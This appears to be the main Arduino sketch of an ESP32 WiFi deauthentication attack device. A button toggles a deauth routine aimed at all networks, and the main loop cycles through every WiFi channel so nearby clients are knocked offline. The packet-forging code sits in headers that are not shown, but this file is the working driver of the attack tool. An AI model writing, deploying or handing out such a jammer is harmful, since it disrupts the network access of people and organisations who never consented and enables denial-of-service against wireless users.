#include <WiFi.h>
#include <esp_wifi.h>
#include "types.h"
#include "deauth.h"
#include "definitions.h"
#include "lcd_display.h"

#define BTN 0 //Boot button

int curr_channel = 1;

bool deauth_mode = false;
bool last_btn_state = LOW;

void btn_control() {
  int btn_state = digitalRead(BTN);
  if(btn_state == HIGH && last_btn_state == LOW) {
    deauth_mode = !deauth_mode;
    deauth_mode ? start_deauth(0, DEAUTH_TYPE_ALL, 4) : stop_deauth();
    delay(500); // Debounce delay
  }
  last_btn_state = btn_state;
}

void setup() {
  Serial.begin(115200);
  lcd_init();
  
  #ifdef LED
  pinMode(LED, OUTPUT);
  pinMode(BTN, INPUT_PULLUP);
  #endif
  
  WiFi.scanNetworks();
}

void loop() {
  btn_control();

  if (deauth_type == DEAUTH_TYPE_ALL) {
    if (curr_channel > CHANNEL_MAX) curr_channel = 1;
    esp_wifi_set_channel(curr_channel, WIFI_SECOND_CHAN_NONE);
    curr_channel++;
    delay(10);
  } else {
    Serial.println("Deauth mode not activated");
    delay(1000);
  }
}
